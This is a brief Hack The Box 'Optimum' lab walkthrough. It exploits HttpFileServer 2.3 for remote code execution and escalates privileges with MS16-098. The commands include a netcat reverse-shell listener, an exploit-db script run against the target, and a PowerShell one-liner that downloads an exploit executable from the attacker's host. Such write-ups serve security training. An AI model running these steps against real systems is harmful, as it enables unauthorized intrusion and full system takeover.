
1. Recon

> 80 HTTPFileServer httpd 2.3
-  Known exploit for remote code execution

2. Intial Access

To compile the exploit, we need to perform a few tasks:
- Locate the Windows netcat executable file in the kali vm. Copy it to the location where the server will be run
```
cp nc.exe ~/Desktop/
```

- Host a web server on our attack machine (kali) on port 80 in a directory that has the netcat executable file.

```
python -S SimpleHTTPServer
```

- Start a netcat listener on the attack machine.
```
nc -nlvp 5555
```

- Download the exploit and change the ip_addr & local_port variables in the script to match the ip address of the attack machine and the port that netcat is listening on.
```
searchsploit -m 39161.py
```

Run the script using python as stated in the Usage comment.
```
python 39161.py 10.10.10.8 80
```

3. Post Exploit

- We got the shell as optimim user, now need to escalate
- Download Windows Exploit Suggestor
```
git clone https://github.com/GDSSecurity/Windows-Exploit-Suggester.git
```
- update the suggestor
```
pip install xlrd --upgrade
./windows-exploit-suggester.py --update
```
- save output of "systeminfo" in a text file and use it with suggestor
```
./windows-exploit-suggester.py --database 2019-10-05-mssb.xls --systeminfo sysinfo.txt
```

- The Windows OS seems to be vulnerable to many exploits! Let’s try MS16–098

4. Privilege Escalation
- In the exploit database, it gives you a link to a precompiled executable. Download the executable on the attack machine.

```
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
```
- transfer it to the target machine
```
python -m SimpleHTTPServer 9005

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.6:9005/41020.exe', 'c:\Users\Public\Downloads\41020.exe')"
```

- run the explout on target and we get root






Reference
https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/optimum-writeup-w-o-metasploit#id-8798